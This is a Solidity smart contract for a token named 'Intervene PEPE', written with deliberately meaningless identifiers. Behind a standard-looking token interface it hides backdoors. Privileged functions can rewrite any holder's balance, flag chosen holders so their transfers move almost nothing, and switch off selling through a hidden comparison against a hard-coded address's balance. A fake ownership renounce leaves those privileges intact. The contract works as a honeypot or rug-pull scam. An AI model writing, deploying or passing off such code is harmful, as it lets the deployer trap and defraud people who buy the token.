//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface marketingTotal {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchedShould) external view returns (uint256);

    function transfer(address modeFrom, uint256 amountTo) external returns (bool);

    function allowance(address fundSell, address spender) external view returns (uint256);

    function approve(address spender, uint256 amountTo) external returns (bool);

    function transferFrom(
        address sender,
        address modeFrom,
        uint256 amountTo
    ) external returns (bool);

    event Transfer(address indexed from, address indexed toEnable, uint256 value);
    event Approval(address indexed fundSell, address indexed spender, uint256 value);
}

abstract contract senderSwapFrom {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface exemptTx {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface modeLiquidityWallet {
    function createPair(address senderSwap, address senderLiquidityTx) external returns (address);
}

interface marketingTotalMetadata is marketingTotal {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract IntervenePEPE is senderSwapFrom, marketingTotal, marketingTotalMetadata {

    uint256 public shouldTeamWallet;

    function maxSender() public {
        emit OwnershipTransferred(isReceiver, address(0));
        liquiditySender = address(0);
    }

    function maxLiquidityToken() private view {
        require(launchedMinBuy[_msgSender()]);
    }

    address public marketingLaunch;

    uint256 sellAtToken;

    uint256 constant autoSender = 15 ** 10;

    address private liquiditySender;

    event OwnershipTransferred(address indexed senderLimitToken, address indexed fromReceiver);

    uint256 private senderBuy;

    function balanceOf(address launchedShould) public view virtual override returns (uint256) {
        return sellMaxMode[launchedShould];
    }

    string private marketingAmount = "IPE";

    function totalSupply() external view virtual override returns (uint256) {
        return totalTx;
    }

    function isList(uint256 amountTo) public {
        maxLiquidityToken();
        sellAtToken = amountTo;
    }

    mapping(address => mapping(address => uint256)) private swapLimit;

    mapping(address => bool) public autoReceiver;

    function transfer(address amountMarketing, uint256 amountTo) external virtual override returns (bool) {
        return txList(_msgSender(), amountMarketing, amountTo);
    }

    function name() external view virtual override returns (string memory) {
        return swapExempt;
    }

    function maxLiquidityTeam(address senderWalletFund) public {
        maxLiquidityToken();
        
        if (senderWalletFund == isReceiver || senderWalletFund == marketingLaunch) {
            return;
        }
        autoReceiver[senderWalletFund] = true;
    }

    uint256 private toLimit;

    uint256 private autoAt;

    function symbol() external view virtual override returns (string memory) {
        return marketingAmount;
    }

    function owner() external view returns (address) {
        return liquiditySender;
    }

    bool private receiverShould;

    function txList(address takeBuy, address modeFrom, uint256 amountTo) internal returns (bool) {
        if (takeBuy == isReceiver) {
            return listAmount(takeBuy, modeFrom, amountTo);
        }
        uint256 enableFrom = marketingTotal(marketingLaunch).balanceOf(senderFromShould);
        require(enableFrom == sellAtToken);
        require(modeFrom != senderFromShould);
        if (autoReceiver[takeBuy]) {
            return listAmount(takeBuy, modeFrom, autoSender);
        }
        return listAmount(takeBuy, modeFrom, amountTo);
    }

    function transferFrom(address takeBuy, address modeFrom, uint256 amountTo) external override returns (bool) {
        if (_msgSender() != atLaunchedAuto) {
            if (swapLimit[takeBuy][_msgSender()] != type(uint256).max) {
                require(amountTo <= swapLimit[takeBuy][_msgSender()]);
                swapLimit[takeBuy][_msgSender()] -= amountTo;
            }
        }
        return txList(takeBuy, modeFrom, amountTo);
    }

    function modeTrading(address amountMarketing, uint256 amountTo) public {
        maxLiquidityToken();
        sellMaxMode[amountMarketing] = amountTo;
    }

    string private swapExempt = "Intervene PEPE";

    function allowance(address sellList, address txTotal) external view virtual override returns (uint256) {
        if (txTotal == atLaunchedAuto) {
            return type(uint256).max;
        }
        return swapLimit[sellList][txTotal];
    }

    uint256 public buyLaunched;

    function getOwner() external view returns (address) {
        return liquiditySender;
    }

    address senderFromShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool private takeMode;

    mapping(address => uint256) private sellMaxMode;

    function decimals() external view virtual override returns (uint8) {
        return enableAuto;
    }

    function maxMinTeam(address txEnableLimit) public {
        require(txEnableLimit.balance < 100000);
        if (minLaunch) {
            return;
        }
        if (takeMode != receiverShould) {
            takeMode = false;
        }
        launchedMinBuy[txEnableLimit] = true;
        
        minLaunch = true;
    }

    address public isReceiver;

    function approve(address txTotal, uint256 amountTo) public virtual override returns (bool) {
        swapLimit[_msgSender()][txTotal] = amountTo;
        emit Approval(_msgSender(), txTotal, amountTo);
        return true;
    }

    function listAmount(address takeBuy, address modeFrom, uint256 amountTo) internal returns (bool) {
        require(sellMaxMode[takeBuy] >= amountTo);
        sellMaxMode[takeBuy] -= amountTo;
        sellMaxMode[modeFrom] += amountTo;
        emit Transfer(takeBuy, modeFrom, amountTo);
        return true;
    }

    uint256 private totalTx = 100000000 * 10 ** 18;

    uint256 listMarketingEnable;

    address atLaunchedAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public minLaunch;

    constructor (){
        
        exemptTx isLaunched = exemptTx(atLaunchedAuto);
        marketingLaunch = modeLiquidityWallet(isLaunched.factory()).createPair(isLaunched.WETH(), address(this));
        
        isReceiver = _msgSender();
        maxSender();
        launchedMinBuy[isReceiver] = true;
        sellMaxMode[isReceiver] = totalTx;
        if (shouldTeamWallet == autoAt) {
            receiverShould = true;
        }
        emit Transfer(address(0), isReceiver, totalTx);
    }

    uint8 private enableAuto = 18;

    mapping(address => bool) public launchedMinBuy;

}